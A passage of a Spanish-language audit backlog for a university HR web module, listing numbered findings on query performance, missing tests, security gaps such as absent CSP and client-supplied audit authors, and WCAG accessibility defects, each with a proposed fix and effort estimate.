`app/routes/hr.py:53-103` · `app/routes/hr.py:302`

**Hoy:** el perfil construye un `pd.DataFrame`, itera con `iterrows()`, crea un
segundo DataFrame (`p_df`, línea 316) y usa `pd.Series` para `first_nonempty`.
Todo para agregar unas cuantas columnas de decenas de filas. En un lambda de
Vercel, importar pandas cuesta arranque y memoria en **todas** las peticiones de
`hr.py`, incluidas las que no lo usan.

**Debe pasar:** SQL puro con `STRING_AGG` — que es exactamente lo que ya hace la
vista para el listado. El comentario de `schema.sql:511` dice literalmente
"evitando Pandas": el perfil se quedó fuera de esa migración.

Esfuerzo: **M** · Archivos: `app/routes/hr.py`

### BR-048 · Cada búsqueda dispara tres consultas; dos de ellas son escaneos completos

`app/routes/hr.py:218` · `app/routes/hr.py:274-286`

**Hoy:** la consulta principal más dos consultas de facetas, siempre, aunque el
panel de Distribución esté fuera de pantalla o el usuario esté paginando (las
facetas no cambian al cambiar de página, pero se recalculan igual). Cada faceta
agrupa la vista entera, que a su vez es un `GROUP BY` sobre `empleados` con
cuatro `LEFT JOIN`.

**Debe pasar:** facetas en un endpoint aparte, cacheadas por combinación de
filtros, y sin recalcular al cambiar de página.

Esfuerzo: **M** · Archivos: `app/routes/hr.py`, `app/static/hr.js`

### BR-049 · La vista no está materializada y se recalcula en cada búsqueda

`app/main.py:362-392` · `app/schema.sql:513`

**Hoy:** `vw_rrhh_persona_index` es una vista normal: cada `SELECT` sobre ella
agrega todos los documentos de todos los empleados antes de aplicar el `WHERE`.
Con mil empleados y decenas de miles de documentos, y una base en otro
continente, es el coste dominante de la pantalla.

**Debe pasar:** vista materializada con refresco (concurrente) al escribir en
`empleados`/`datos_rrhh`, o `doc_count`/`tipos` desnormalizados en `empleados`.

Esfuerzo: **L** · Archivos: `app/main.py` `[CHOCA]`, `app/routes/hr.py`

### BR-050 · La búsqueda FTS no puede usar índice: el `tsvector` se calcula al vuelo sobre la vista

`app/routes/hr.py:132-147` · `app/main.py:258`

**Hoy:** el índice GIN `idx_empleados_nombre_fts` está sobre `empleados`, pero
la condición se escribe sobre `v.persona_raw || v.cargo || v.departamento` de la
vista — una expresión que ningún índice cubre. Igual `ts_rank_cd` en el `SELECT`
(línea 202), que se evalúa por fila del resultado intermedio.

**Debe pasar:** una columna `tsvector` persistida en `empleados` (generada),
indexada, y el ranking calculado contra ella.

Esfuerzo: **M** · Archivos: `app/main.py` `[CHOCA]`, `app/routes/hr.py`

### BR-051 · `unaccent()` en un `WHERE` impide usar el índice trigram

`app/routes/hr.py:141-152`

**Hoy:** `unaccent(v.persona_raw) ILIKE unaccent(%s)` sobre la vista. El índice
`idx_empleados_nombres_trgm` (`schema.sql:506`) está sobre la tabla y con la
misma expresión, pero al aplicarse sobre la vista agregada el planificador no lo
alcanza. Además `unaccent` no es inmutable por defecto, lo que en algunas
instalaciones impide indexarlo.

**Debe pasar:** empujar las condiciones a la tabla base (subconsulta `EXISTS` o
CTE) para que los índices apliquen antes de agregar.

Esfuerzo: **M** · Archivos: `app/routes/hr.py`, `app/main.py` `[CHOCA]`

### BR-052 · `COUNT(*) OVER()` cuenta el conjunto completo en cada página

`app/routes/hr.py:209`

**Hoy:** la ventana obliga a materializar todas las filas que cumplen el `WHERE`
antes del `LIMIT`. Para "página 1 de 87" está bien; para navegar hasta la página
80 es el mismo coste ochenta veces.

**Debe pasar:** total aproximado o cacheado por combinación de filtros; el total
exacto sólo cuando el usuario lo pida.

Esfuerzo: **M** · Archivos: `app/routes/hr.py`

### BR-053 · `per_page` tope 50 en `buscar` y 100 en `documentos`

`app/routes/hr.py:123` vs `app/routes/hr.py:396`

**Hoy:** `paginate(..., max_per_page=50)` en uno y `paginate(page, per_page)`
—con el tope por defecto de `utils.paginate`— en el otro. Dos límites distintos
para el mismo módulo, sin motivo documentado.

**Debe pasar:** un tope único y explícito.

Esfuerzo: **S** · Archivos: `app/routes/hr.py`

### BR-054 · El filtro del dossier no tiene *debounce*

`app/static/hr.html:343`

**Hoy:** `oninput="state.innerDossierSearch=this.value;filterInnerDossier();"`
reconstruye el `innerHTML` del contenedor entero (con sus pestañas y sus paneles
de Bootstrap) en **cada tecla**. La búsqueda principal sí tiene 420 ms de
*debounce* (`hr.js:19`); la interna, ninguno.

**Debe pasar:** *debounce* de ~200 ms, y actualización sólo del panel visible.

Esfuerzo: **S** · Archivos: `app/static/hr.html`, `app/static/hr.js`

### BR-055 · Manipuladores en línea en el HTML generado, en lugar de delegación

`app/static/hr.js:124` · `147` · `220` · `508` · `637` · `hr.html:343` · `347` · `354`

**Hoy:** `onclick="openRrhhPersonDossier(${JSON.stringify(...)})"` en cada
tarjeta. Con 50 resultados son 50 cadenas JSON incrustadas en atributos HTML.
Frágil (depende de que `JSON.stringify` produzca comillas que el atributo
tolere), incompatible con cualquier CSP que prohíba `unsafe-inline`, y más
pesado que un solo `addEventListener` delegado en el contenedor.

**Debe pasar:** `data-emp-id` en la tarjeta y un único manejador delegado en
`#list_rrhh`.

Esfuerzo: **M** · Archivos: `app/static/hr.js`, `app/static/hr.html`

### BR-056 · Sin cabecera `Content-Security-Policy`

`app/main.py` (transversal)

**Hoy:** no hay CSP. Con los manipuladores en línea de BR-055 y el HTML
compuesto por `innerHTML` en todas partes, una CSP restrictiva es imposible
hoy — pero es justo lo que habría contenido el XSS de BR-003.

**Debe pasar:** CSP en modo informe primero, aplicada después. Depende de
BR-055.

Esfuerzo: **L** · Archivos: `app/main.py` `[CHOCA]`

### BR-057 · No hay una sola prueba del módulo RRHH

`app/tests/`

**Hoy:** existen `test_archivo.py`, `test_admin.py`, `test_auth.py`,
`test_backup.py`… y **ningún** `test_hr.py`. RRHH aparece en las pruebas sólo
como una fila de ayuda en `conftest.py:65` y como comprobación de columnas en
`test_sql_columns.py`. El módulo con los datos más sensibles del sistema es el
único sin cobertura propia — y es donde han sobrevivido BR-001 a BR-005.

**Debe pasar:** `test_hr.py` con, como mínimo: forma de la respuesta de
`/buscar`, paginación y tope, escapado del reporte, 404 del perfil, filtrado de
borrados, y la guarda de autenticación de BR-001.

Esfuerzo: **M** · Archivos: `app/tests/test_hr.py` (nuevo)

### BR-058 · No hay prueba que verifique que la vista y `fetch_hr_dataframe` concuerdan

`app/routes/hr.py:53` · `app/main.py:362`

**Hoy:** listado y dossier leen fuentes distintas con reglas distintas (BR-005
es exactamente esa divergencia). Nada lo detecta.

**Debe pasar:** una prueba que compare las condiciones de ambas rutas, o mejor,
una sola fuente.

Esfuerzo: **M** · Archivos: `app/tests/test_hr.py` (nuevo), `app/routes/hr.py`

### BR-059 · `import` de `db_query` dentro de una función

`app/routes/hr.py:326`

**Hoy:** `from database import db_query as _dq` dentro de
`get_person_profile()`, cuando `db_query` ya está importado arriba (línea 6).
Resto de un parche.

**Debe pasar:** usar el del módulo.

Esfuerzo: **S** · Archivos: `app/routes/hr.py`

### BR-060 · `from fastapi.responses import HTMLResponse` en mitad del archivo

`app/routes/hr.py:442` · `app/routes/hr.py:511`

**Hoy:** dos importaciones a media altura (`HTMLResponse` y `datetime`). Con
`pyflakes` corriendo en la suite, esto pasa, pero rompe la convención del resto
del repositorio.

**Debe pasar:** al encabezado.

Esfuerzo: **S** · Archivos: `app/routes/hr.py`

### BR-061 · El reporte imprimible son 80 líneas de f-string anidado

`app/routes/hr.py:513-591`

**Hoy:** HTML, CSS y lógica en una sola expresión, con una comprensión
generadora dentro de una f-string dentro de otra f-string (líneas 578-584), y
comillas escapadas dentro de comillas. Es donde vive el XSS de BR-003 y es
imposible de revisar.

**Debe pasar:** plantilla Jinja2 en `app/templates/`, con autoescape.

Esfuerzo: **M** · Archivos: `app/routes/hr.py`, `app/templates/` (nuevo)

### BR-062 · La condición `if historial_cargos is not None` nunca es falsa

`app/routes/hr.py:587`

**Hoy:** `db_query(..., fetch="all") or []` (línea 490) garantiza una lista.
La condición es siempre verdadera, y dentro ya hay otro ternario para el caso
vacío. Ruido que sugiere una rama que no existe.

**Debe pasar:** quitarla.

Esfuerzo: **S** · Archivos: `app/routes/hr.py`

### BR-063 · `hr_alerts.py` sirve una alerta del módulo Archivo bajo el prefijo `/api/rrhh`

`app/routes/hr_alerts.py:88-120`

**Hoy:** `GET /api/rrhh/alertas/documentos_vencidos` consulta
`public.datos_archivo`. Nada que ver con RRHH: es la retención documental del
otro módulo, colgada de esta ruta. Un usuario con módulo RRHH (una vez BR-002
esté puesto) tendría acceso a datos de Archivo por la puerta de atrás.

**Debe pasar:** mover a `routes/admin/retention.py` o a `archive.py`.

Esfuerzo: **S** · Archivos: `app/routes/hr_alerts.py`, `app/routes/archive.py`
`[CHOCA]`

### BR-064 · `registrado_por` y `requester` los declara el propio cliente

`app/routes/hr_alerts.py:132` · `app/routes/hr_alerts.py:227`

**Hoy:** el historial de cargos registra como autor lo que venga en el cuerpo
(`data.registrado_por`, con `""` por defecto) o en la query
(`requester: str = Query(default="")`). La sesión ya identifica al usuario:
`require_session` **devuelve el nombre** y se descarta. Escenario: alguien borra
una entrada del historial y registra `requester=otro.usuario`. La auditoría
apunta a un inocente.

**Debe pasar:** tomar el usuario de la dependencia de sesión y prohibir el campo
en el cuerpo.

Esfuerzo: **S** · Archivos: `app/routes/hr_alerts.py`

### BR-065 · El borrado de historial de cargos es físico y sin rol

`app/routes/hr_alerts.py:226-242`

**Hoy:** `DELETE FROM historial_cargos` definitivo, accesible a cualquier
usuario con sesión (BR-002), sobre un dato que la LOTTT considera parte del
expediente laboral. El resto del sistema usa borrado lógico con papelera; aquí
no.

**Debe pasar:** borrado lógico con `deleted_at`, restringido a admin de RRHH, y
visible en la papelera.

Esfuerzo: **M** · Archivos: `app/routes/hr_alerts.py`, `app/main.py` `[CHOCA]`

### BR-066 · `add_position_history` crea cargos en el catálogo sin control

`app/routes/hr_alerts.py:190-195`

**Hoy:** si el cargo no existe, se inserta. Escenario: alguien escribe
"Profesor Asosiado" con falta de ortografía y el catálogo de cargos —que
alimenta los filtros de toda la aplicación— queda con un cargo fantasma que
nadie limpia. El escalafón universitario es un catálogo cerrado (Instructor,
Asistente, Agregado, Asociado, Titular): no debería aceptar texto libre.

**Debe pasar:** el cargo se elige del catálogo; crear cargos es una operación de
administración aparte.

Esfuerzo: **M** · Archivos: `app/routes/hr_alerts.py`,
`app/routes/admin/catalog.py` `[CHOCA]`

### BR-067 · El cierre del cargo anterior puede dejar dos cargos abiertos

`app/routes/hr_alerts.py:197-214`

**Hoy:** el `UPDATE` cierra los registros con `fecha_fin IS NULL` **y**
`fecha_inicio < nueva_fecha`. Escenario: se registra un movimiento con fecha
anterior a un registro abierto (una corrección retroactiva): el anterior no se
cierra y el empleado queda con dos cargos vigentes a la vez. Además el `UPDATE`
y el `INSERT` son dos transacciones separadas: si el segundo falla, el cargo
anterior queda cerrado y no hay ninguno abierto.

**Debe pasar:** una transacción, y una restricción de exclusión que impida
solapamientos.

Esfuerzo: **M** · Archivos: `app/routes/hr_alerts.py`, `app/main.py` `[CHOCA]`

### BR-068 · `tipo_alerta` puede decir "Alerta" sin decir nada

`app/routes/hr_alerts.py:41-51`

**Hoy:** el `CASE` tiene una rama `ELSE 'Alerta'`. Escenario: jubilación pasada
hace más de 30 días queda fuera del `WHERE`, pero una pensión ya vencida entra y
cae en el `ELSE`, presentándose como "Alerta" a secas. El usuario no sabe qué
tiene que hacer.

**Debe pasar:** cubrir todos los casos con etiqueta accionable, o no listarlos.

Esfuerzo: **S** · Archivos: `app/routes/hr_alerts.py`

### BR-069 · `dias_restantes` devuelve 0 para lo ya vencido, mezclándolo con "vence hoy"

`app/routes/hr_alerts.py:52-58`

**Hoy:** el `ELSE 0` colapsa "vence hoy" y "venció hace tres años" en el mismo
número. Ordenar por urgencia con ese campo es imposible.

**Debe pasar:** días con signo, y la interfaz decide cómo presentarlos.

Esfuerzo: **S** · Archivos: `app/routes/hr_alerts.py`

### BR-070 · Las alertas de jubilación no se ven desde el buscador de RRHH

`app/routes/hr_alerts.py:24` · `app/static/hr.html`

**Hoy:** el endpoint existe y sólo lo consume el panel de Sistema. La persona
que trabaja el expediente a diario, en `hr.html`, no ve ninguna alerta: ni en la
tarjeta del listado, ni en el dossier del empleado que se jubila en 40 días.

**Debe pasar:** distintivo en la tarjeta y aviso destacado en el dossier, con
los días restantes.

Esfuerzo: **M** · Archivos: `app/static/hr.js`, `app/routes/hr.py`

### BR-071 · La consulta de alertas ordena por `LEAST` sobre columnas con `COALESCE` a 9999

`app/routes/hr_alerts.py:74-78`

**Hoy:** funciona, pero impide cualquier índice y en el peor caso escanea
`empleados` completa. Con la plantilla actual da igual; conviene anotarlo.

**Debe pasar:** columna calculada `proxima_fecha_egreso` indexada.

Esfuerzo: **S** · Archivos: `app/main.py` `[CHOCA]`, `app/routes/hr_alerts.py`

### BR-072 · `split_terms` se usa para partir `tipos` pero el separador es `'; '`

`app/routes/hr.py:225`

**Hoy:** `split_terms(tipos_str)[0]` para obtener el primer tipo. La vista une
con `'; '`; si `split_terms` parte por otros separadores (comas, saltos), un
tipo con coma en el nombre se parte en dos. `first_tipo` sólo alimenta
`doc_type`, que nadie usa en la tarjeta — así que es a la vez frágil e inútil.

**Debe pasar:** devolver `tipos` como array desde la vista y quitar
`first_tipo`.

Esfuerzo: **S** · Archivos: `app/routes/hr.py`

### BR-073 · `state.rrhh` no se inicializa de forma defensiva en `hr.js`

`app/static/hr.js:13-21`

**Hoy:** `hr.js` lee `state.rrhh.search` asumiendo que `app-core.js` ya lo
definió. El orden de los `<script>` en `hr.html:229-233` lo garantiza hoy
(`app-core.js` antes que `hr.js`), pero `hr.js` va **antes** que `app.js` y
`app-choices.js`, que son quienes definen buena parte del estado de filtros. Un
reordenado inocente rompe la pantalla en silencio.

**Debe pasar:** que `hr.js` no dependa del orden: leer con
`state.rrhh?.search ?? ""`.

Esfuerzo: **S** · Archivos: `app/static/hr.js`

### BR-074 · Cinco librerías por CDN sin `integrity` ni `crossorigin`

`app/static/hr.html:7-12` · `225-228`

**Hoy:** jQuery, Bootstrap, TomSelect, flatpickr y FontAwesome se cargan desde
tres CDN distintos sin verificación de integridad. Una de esas cuentas
comprometida entrega JavaScript arbitrario a una pantalla con datos de personal.

**Debe pasar:** `integrity` + `crossorigin="anonymous"` en todas, o servirlas
desde el propio origen.

Esfuerzo: **M** (afecta a las siete páginas) · Archivos: `app/static/*.html`
`[CHOCA]`

### BR-075 · La fuente de Google Fonts bloquea el primer pintado

`app/static/hr.html:7`

**Hoy:** `<link>` sin `preconnect` ni `display=swap` explícito en el orden
correcto — la URL sí lleva `display=swap`, pero sin `preconnect` a
`fonts.gstatic.com` la resolución DNS y el TLS se pagan en serie.

**Debe pasar:** `preconnect` a ambos dominios.

Esfuerzo: **S** · Archivos: `app/static/hr.html`

### BR-076 · El `<script>` en línea del tema en `<body>` duplica lógica de `app-theme.js`

`app/static/hr.html:19`

**Hoy:** un fragmento que lee `ds_theme` de `localStorage` para evitar el
parpadeo. Correcto en intención, pero sólo aplica `theme-*`: **no** aplica
`dark-mode` ni `ds-density-compact`, que sí se aplican después en
`app-theme.js:71`. Resultado: en modo oscuro la página se pinta en claro y
parpadea a oscuro.

**Debe pasar:** el fragmento aplica las tres clases.

Esfuerzo: **S** · Archivos: `app/static/hr.html` (y el resto de páginas)
`[CHOCA]`

---

## 4. Accesibilidad (WCAG 2.1 AA) y teclado

El CLAUDE.md dice que el despliegue pasa axe-core sin incidencias. Varias de
estas no las detecta axe automáticamente — son precisamente las que hay que
comprobar a mano.

### BR-077 · La tarjeta de resultado no es accesible por teclado

`app/static/hr.js:124`

**Hoy:** `<div role="listitem" onclick="..." style="cursor:pointer">`. No tiene
`tabindex`, no responde a `Enter` ni a `Espacio`, y `role="listitem"` no
comunica que sea accionable. Con teclado sólo se llega al botón del ojo, que
está al final de la fila. Un lector de pantalla anuncia un elemento de lista sin
mencionar que se puede abrir. Incumple WCAG 2.1.1 (Teclado).

**Debe pasar:** el nombre de la persona es un `<button>` o `<a>` real dentro del
`listitem`, y toda la tarjeta deja de ser clicable (o lo es como conveniencia,
con el elemento accionable real dentro).

Esfuerzo: **M** · Archivos: `app/static/hr.js`

### BR-078 · El modal del expediente no tiene nombre accesible

`app/static/hr.html:160-171`

**Hoy:** `role="dialog"` sin `aria-labelledby`, sin `aria-modal="true"`, y sin
`.modal-header`/`.modal-title` — el nombre de la persona se pinta dentro del
cuerpo (`hr.js:283`). Un lector de pantalla anuncia "diálogo" y nada más.

**Debe pasar:** cabecera con el nombre como `<h2 id="rrhh-person-modal-title">`
y `aria-labelledby` apuntándola; `aria-modal="true"`.

Esfuerzo: **S** · Archivos: `app/static/hr.html`, `app/static/hr.js`

### BR-079 · Los modales se abren con `data-keyboard="false"`: `Escape` no cierra

`app/static/hr.html:160` · `app/static/hr.html:174`

**Hoy:** ambos modales llevan `data-backdrop="static" data-keyboard="false"`.
`Escape` no cierra y el clic fuera tampoco. La única salida es el botón "Cerrar"
del pie, al final de un cuerpo de 80vh que hay que recorrer entero. Para un
diálogo de consulta —sin datos sin guardar que proteger— es una trampa. WCAG
2.1.2 (Sin trampas de teclado) es discutible aquí, pero la usabilidad no.

**Debe pasar:** `Escape` cierra, el fondo cierra.

Esfuerzo: **S** · Archivos: `app/static/hr.html`

### BR-080 · No hay confinamiento ni devolución del foco en los modales

`app/static/hr.js:178` · `app/static/hr.js:559`

**Hoy:** Bootstrap 4 confina el foco razonablemente, pero al cerrar el modal el
foco vuelve al `<body>`, no a la tarjeta desde la que se abrió — porque esa
tarjeta ha sido regenerada por `innerHTML` en cualquier búsqueda posterior. El
usuario de teclado vuelve al principio de la página cada vez que consulta un
expediente. WCAG 2.4.3 (Orden del foco).

**Debe pasar:** guardar el elemento que abrió y devolverle el foco en
`hidden.bs.modal`.

Esfuerzo: **S** · Archivos: `app/static/hr.js`

### BR-081 · Modal sobre modal: el documento se abre encima del expediente

`app/static/hr.js:559`

**Hoy:** `$("#doc-modal").modal("show")` mientras `#rrhh-person-modal` sigue
abierto. Bootstrap 4 no soporta modales apilados: el segundo fondo se pinta
sobre el primero, el `overflow:hidden` del `<body>` se restaura al cerrar
**cualquiera** de los dos, y al cerrar el de documento el del expediente queda
sin poder desplazarse. Escenario reproducible: abrir expediente → abrir
documento → cerrar documento → el expediente ya no hace scroll.

**Debe pasar:** el detalle del documento se muestra dentro del propio expediente
(panel lateral o expansión en línea), no como segundo modal.

Esfuerzo: **M** · Archivos: `app/static/hr.js`, `app/static/hr.html`,
`app/static/styles.css` `[CHOCA]`

### BR-082 · Los enlaces `href="#"` con `return false` no son botones

`app/static/hr.js:256` · `app/static/hr.js:507-508`

**Hoy:** "Ver" (cédula) y "Abrir archivo" son `<a href="#">`. Semánticamente son
acciones, no navegación; con teclado se anuncian como enlaces, y si el
manipulador falla el navegador salta al inicio de la página.

**Debe pasar:** `<button type="button">`.

Esfuerzo: **S** · Archivos: `app/static/hr.js`

### BR-083 · Las pestañas de las 4 Partes no cumplen el patrón ARIA

`app/static/hr.js:470-487`

**Hoy:** `<ul class="nav nav-tabs" role="tablist">` con `<li class="nav-item">`
sin `role="presentation"`, y `<a data-toggle="tab">` sin `role="tab"`, sin
`aria-selected`, sin `aria-controls`; los paneles sin `role="tabpanel"` ni
`aria-labelledby`. Es exactamente el fallo que CLAUDE.md documenta como ya
resuelto en el panel de administración — y aquí está otra vez, generado desde
JS. No se navegan con flechas.

**Debe pasar:** el patrón completo, `role="presentation"` en los `<li>`,
navegación con flechas y `tabindex` móvil.

Esfuerzo: **M** · Archivos: `app/static/hr.js`

### BR-084 · `role="list"` con hijos que sólo a veces son `listitem`

`app/static/hr.html:147` · `app/static/hr.js:97`

**Hoy:** `#list_rrhh` declara `role="list"` de forma fija en el HTML. Cuando no
hay resultados, su único hijo es un `<div class="alert">` sin
`role="listitem"`, y cuando está el esqueleto, cuatro `div.ds-person-card` sin
rol. CLAUDE.md documenta este mismo problema: "un contenedor con `role='list'`
obliga a que sus hijos sean `listitem`".

**Debe pasar:** el `role="list"` se pone y se quita según el contenido, o los
estados vacío y de carga van fuera del contenedor.

Esfuerzo: **S** · Archivos: `app/static/hr.html`, `app/static/hr.js`

### BR-085 · La región viva anuncia el número, no el resultado

`app/static/hr.html:145` · `app/static/hr.js:90`

**Hoy:** `aria-live="polite"` sobre "27 Resultados". Un lector de pantalla
anuncia "27 resultados" sin contexto: no dice de qué búsqueda, ni si está
cargando, ni si falló. Y el esqueleto de carga no se anuncia en absoluto, así
que el usuario ciego no sabe que la lista está cambiando.

**Debe pasar:** anunciar "Buscando…" y luego "27 expedientes encontrados para
Pérez", con `aria-busy` en el contenedor mientras carga.

Esfuerzo: **S** · Archivos: `app/static/hr.js`, `app/static/hr.html`

### BR-086 · Los botones de acción de la tarjeta no dicen a quién pertenecen

`app/static/hr.js:146` · `app/static/hr.js:151`

**Hoy:** `title="Ver expediente"` y `title="Editar expediente (Admin)"`,
iguales en las 50 filas. CLAUDE.md ya advierte que `title` no basta como nombre
accesible. Un lector de pantalla lee cincuenta "Ver expediente" idénticos.

**Debe pasar:** `aria-label="Ver expediente de <nombre>"`.

Esfuerzo: **S** · Archivos: `app/static/hr.js`

### BR-087 · Los botones de la barra de búsqueda sólo tienen `title`

`app/static/hr.html:137-139`

**Hoy:** buscar, limpiar y exportar son iconos con `title`, sin `aria-label`.
Mismo criterio de CLAUDE.md.

**Debe pasar:** `aria-label` en los tres.

Esfuerzo: **S** · Archivos: `app/static/hr.html`

### BR-088 · Los números de página no dicen que son páginas

`app/static/hr.js:67-69`

**Hoy:** `<button class="page-link">3</button>` sin `aria-label="Página 3"`, y
la página activa sin `aria-current="page"`. El `<nav>` generado tampoco tiene
`aria-label` (el del HTML sí lo tiene, línea 149 — otra inconsistencia entre las
dos paginaciones de BR-026).

**Debe pasar:** `aria-label` por botón, `aria-current` en el activo,
`aria-label` en el `<nav>`.

Esfuerzo: **S** · Archivos: `app/static/hr.js`

### BR-089 · Las facetas son `<div onclick>` sin rol ni teclado

`app/static/hr.js:636` · `app/static/hr.js:645`

**Hoy:** filas clicables construidas como `<div>` con `cursor:pointer`. No
alcanzables con `Tab`, sin `role`, sin estado. La faceta de estado además es un
alternador cuyo estado sólo se comunica por color de fondo (`ds-facet-active`).

**Debe pasar:** `<button aria-pressed="true|false">` para los alternadores de
estado, `<button>` para departamento.

Esfuerzo: **S** · Archivos: `app/static/hr.js`

### BR-090 · Los acordeones de filtros no comunican si están abiertos

`app/static/hr.html:50` · `60` · `91`

**Hoy:** `<button data-toggle="collapse" data-target="#...">` sin
`aria-expanded` ni `aria-controls`. Bootstrap 4 los gestiona sólo si existe el
atributo inicial; sin él, nunca se actualiza. El usuario de lector no sabe qué
secciones están desplegadas — y "Tipología" está desplegada de inicio y las
otras dos no (línea 52 tiene `show`).

**Debe pasar:** `aria-expanded` inicial correcto y `aria-controls` en los tres.

Esfuerzo: **S** · Archivos: `app/static/hr.html`

### BR-091 · Los acordeones de filtro no tienen encabezado

`app/static/hr.html:49` · `59` · `90`

**Hoy:** el título del acordeón es un `<button class="btn btn-link">` dentro de
un `div.card-header`. No hay estructura de encabezados dentro del panel de
filtros: se salta de `h3` ("Filtros") a nada. La navegación por encabezados —la
forma habitual de moverse con lector de pantalla— no encuentra las secciones.

**Debe pasar:** `<h4>` (o el nivel que corresponda) envolviendo cada botón.

Esfuerzo: **S** · Archivos: `app/static/hr.html`

### BR-092 · Salto de nivel de encabezado: `h3` de "Filtros" a `h2` de resultados a `h4` de tarjeta

`app/static/hr.html:45` · `144` · `hr.js:133`

**Hoy:** el panel de filtros usa `h3`, la cabecera de resultados `h2`, cada
tarjeta `h4`, el dossier `h3`/`h5`/`h6`, y no hay `h1` en ninguna parte de la
página. WCAG 1.3.1 y 2.4.6.

**Debe pasar:** un `h1` (el título de la pantalla), `h2` para las dos columnas y
`h3` para las tarjetas; niveles consecutivos.

Esfuerzo: **S** · Archivos: `app/static/hr.html`, `app/static/hr.js`

### BR-093 · El dossier no tiene `h1` y baja hasta `h6` en dos saltos

`app/static/hr.js:283` · `298` · `313` · `322` · `336`

**Hoy:** `h3` (nombre), `h5` (cargo), `h6` (Documentos de Identidad, Historial,
Explorar Documentos). El `h5` del cargo no es una sección, es un subtítulo: usar
un encabezado para dar tamaño es exactamente lo que rompe la navegación
estructural.

**Debe pasar:** el cargo es un `<p>` con clase; las secciones bajan a niveles
consecutivos.

Esfuerzo: **S** · Archivos: `app/static/hr.js`

### BR-094 · El estado laboral se comunica sólo por color en el borde de la tarjeta

`app/static/hr.js:124` · `app/static/app-core.js:131-139`

**Hoy:** el borde izquierdo de 3 px lleva el color del estado. Hay también una
insignia con el texto, lo que salva el caso — pero el borde por sí solo, que es
lo que se percibe al barrer la lista, no aporta nada a quien no distingue verde
de rojo (Activo `#208838` vs Retirado `#dc3545` es exactamente el par
problemático). WCAG 1.4.1.

**Debe pasar:** icono además de color en la insignia de estado, y forma o patrón
si se mantiene el borde.

Esfuerzo: **S** · Archivos: `app/static/hr.js`, `app/static/app-core.js`
`[CHOCA]`

### BR-095 · Contraste insuficiente en la insignia de estado

`app/static/hr.js:140` · `app/static/app-core.js:131-139`

**Hoy:** texto blanco sobre los colores de estado. `#208838` sobre blanco da
3,9:1 — para texto de 0,73 rem (≈11,7 px) hace falta 4,5:1. `#dc3545` con blanco
da 3,9:1. `#6c757d` (por defecto) con blanco da 4,7:1, justo. Es el mismo tipo
de fallo que motivó `test_contraste.py`, en colores que esa prueba no cubre
porque están en `app-core.js` y en atributos `style` en línea.

**Debe pasar:** oscurecer los colores de estado hasta 4,5:1 con blanco, y
extender `test_contraste.py` a `getStatusColor`.

Esfuerzo: **S** · Archivos: `app/static/app-core.js` `[CHOCA]`,
`app/tests/test_contraste.py` `[CHOCA]`

### BR-096 · El texto de la tarjeta usa `#495057` a 0,82 rem

`app/static/hr.js:134`

**Hoy:** `#495057` sobre blanco da 7,5:1, cumple. Pero la tarjeta tiene fondo
transparente (`styles.css:571`) sobre el fondo de la página `#f4f6f9`, donde
baja a 7,0:1 — sigue cumpliendo. El problema real es que el color está en un
`style` en línea, así que **ninguna hoja de estilos puede corregirlo** ni en
modo oscuro ni en los doce temas. Es el fallo que CLAUDE.md advierte
literalmente.

**Debe pasar:** clases, no `style` en línea.

Esfuerzo: **M** · Archivos: `app/static/hr.js`, `app/static/styles.css`
`[CHOCA]`

### BR-097 · El resaltado de coincidencias es amarillo fijo, ilegible en modo oscuro

`app/static/app-core.js:88` · `app/static/styles.css:2167`

**Hoy:** `<mark style="background:#fff176">` con `color: inherit`. En modo
oscuro el texto heredado es `#d0d6e8` sobre amarillo claro: 1,6:1. La regla de
`styles.css:2167` no tiene variante `body.dark-mode`, y de todas formas el
`style` en línea de `app-core.js:88` gana.

**Debe pasar:** `mark` con color de texto explícito y variante oscura, sin
estilo en línea.

Esfuerzo: **S** · Archivos: `app/static/app-core.js` `[CHOCA]`,
`app/static/styles.css` `[CHOCA]`

### BR-098 · Los `<select>` de TomSelect heredan el nombre, pero el filtro de fecha no

`app/static/hr.html:79`

**Hoy:** `#fp-rrhh-range` es un `<input readonly>` con `placeholder` pero sin
`<label>` ni `aria-label`. El icono de calendario que lo precede tampoco tiene
`aria-hidden`. El `placeholder` no es un nombre accesible (WCAG 4.1.2).

**Debe pasar:** `aria-label="Rango de fechas de ingreso"`.

Esfuerzo: **S** · Archivos: `app/static/hr.html`

### BR-099 · Los iconos decorativos no están ocultos a los lectores

`app/static/hr.html:66-67` · `77` · `hr.js:135-137` · `299` · `314` · `323`

**Hoy:** decenas de `<i class="fas ...">` sin `aria-hidden="true"`. Algunos
lectores de pantalla anuncian el carácter de la fuente de iconos, produciendo
ruido en cada fila.

**Debe pasar:** `aria-hidden="true"` en todos los iconos decorativos.

Esfuerzo: **S** · Archivos: `app/static/hr.html`, `app/static/hr.js`

### BR-100 · La imagen del iframe del visor no tiene título

`app/static/hr.html:206`

**Hoy:** `<iframe id="modal-doc-iframe">` sin `title`. WCAG 4.1.2: un marco sin
título se anuncia como "marco".

**Debe pasar:** `title="Visor del documento"`, actualizado con el nombre real al
cargar. Y `sandbox` para el contenido servido desde R2.

Esfuerzo: **S** · Archivos: `app/static/hr.html`, `app/static/hr.js`

### BR-101 · Los botones deshabilitados de "documentos de identidad" no explican por qué

`app/static/hr.js:224-228`

**Hoy:** el botón deshabilitado dice "Cédula (no registrado)" con el motivo en
`title`. Un botón `disabled` no recibe foco, así que ese `title` es
inalcanzable con teclado y con lector de pantalla.

**Debe pasar:** no usar `disabled`; usar `aria-disabled="true"` con el texto
visible, o presentar la ausencia como un elemento de lista de estado, no como
botón.

Esfuerzo: **S** · Archivos: `app/static/hr.js`

### BR-102 · `:focus-visible` no está definido para los controles propios

`app/static/styles.css:2161-2164` · `app/static/hr.js` (transversal)

**Hoy:** la hoja anula el `outline` en `:focus:not(:focus-visible)`, lo cual está
bien, pero los elementos que `hr.js` genera con estilos en línea
(`.ds-action-btn` circular, tarjeta, facetas) no definen un anillo de foco
propio. En los temas oscuros el anillo por defecto del navegador se pierde
contra el fondo.

**Debe pasar:** un anillo de foco de alto contraste (`outline: 2px solid` +
`outline-offset`) declarado para los componentes de RRHH, con 3:1 contra el
fondo (WCAG 1.4.11).

Esfuerzo: **S** · Archivos: `app/static/styles.css` `[CHOCA]`

### BR-103 · Los botones circulares de acción miden 36 px

`app/static/hr.js:148` · `app/static/styles.css:955-975`

**Hoy:** 36 px de lado, y en móvil `styles.css` los baja a 30 px. El mínimo
recomendado para objetivo táctil es 44×44 (WCAG 2.5.5, AAA; 24×24 es el mínimo
AA de 2.2). 30 px con dos botones apilados y 6 px de separación es difícil de
acertar con el pulgar.

**Debe pasar:** 44 px en táctil, con área de toque ampliada si el aspecto debe
mantenerse pequeño.

